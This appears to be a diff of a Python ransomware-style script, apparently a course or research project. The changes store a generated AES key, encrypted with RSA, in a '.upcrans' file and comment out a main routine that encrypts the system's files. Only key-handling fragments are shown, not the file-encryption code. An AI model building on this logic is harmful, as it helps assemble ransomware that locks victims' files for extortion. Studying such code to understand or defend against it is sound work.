@@ -28,13 +28,19 @@ def parse_args():
 
 #Initialize both AES and RSA keys and store in class_keys
 def initialize_keys():
+    #Initialize keys
     keys = class_keys()
     data = (keys.AESkey, keys.PUBLIC_RSAKEY, keys.PRIVATE_RSAKEY, '0')
     bbdd.sql_insert(data)
+
+    #Store AES key encrypted in system
+    with open('fileKey' + ".upcrans", 'wb') as fo:
+                key_encrypted = encrypt_key(keys.AESkey, keys.PUBLIC_RSAKEY)
+                fo.write(key_encrypted)
     return keys
 
 
-# Encrypt KEY (AES) with public key.
+# Encrypt KEY (AES) with public key (RSA).
 def encrypt_key(AESkey, key):
     public_key = RSA.importKey(key)
     encryptor = PKCS1_OAEP.new(public_key)
@@ -42,7 +48,7 @@ def encrypt_key(AESkey, key):
     return encrypted_key
 
 
-# Decrypt KEY (AES) with private key.
+# Decrypt KEY (AES) with private key (RSA).
 def decrypt_key(AESkey, key):
     private_key = RSA.importKey(key)
     decryptor = PKCS1_OAEP.new(private_key)
@@ -150,7 +156,7 @@ def main():
     option = int(sys.argv[1]) 
     l_files = list_files(option)
     keys = initialize_keys()
-
+'''
     if option == 1:
         #Encrypt files of your system
         encrypt_file(l_files, keys.AESkey)
@@ -167,7 +173,7 @@ def main():
 
     else:
         print("No option selected")   
-
+'''
 
 if __name__ == "__main__":
     main()
